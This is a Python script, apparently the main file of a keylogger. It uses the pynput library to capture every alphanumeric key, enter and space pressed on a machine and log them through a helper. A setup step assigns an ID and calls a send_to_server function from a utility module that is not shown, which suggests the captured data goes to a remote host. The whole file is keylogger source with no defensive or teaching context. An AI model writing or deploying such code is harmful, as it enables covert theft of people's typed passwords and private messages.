from utils.utils import create_id, print_log, send_to_server
from pynput import keyboard

def setup():
    create_id()
    send_to_server()

def listen_keyboard():
    print("Listening to keys...")

    def on_press(key):
        try:
            if hasattr(key, 'char') and key.char is not None:
                if key.char.isalnum():
                    print_log(key.char)
            elif key == keyboard.Key.enter:
                print_log("[ENTER]\n")
            elif key == keyboard.Key.space:
                print_log(" ")

        except Exception as e:
            print(f"Error logging key: {e}")

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == '__main__':
    setup()
    try:
        listen_keyboard()
    except KeyboardInterrupt:
        print("Keyboard listener stopped.")
    except Exception as e:
        print(f"An error occurred: {e}")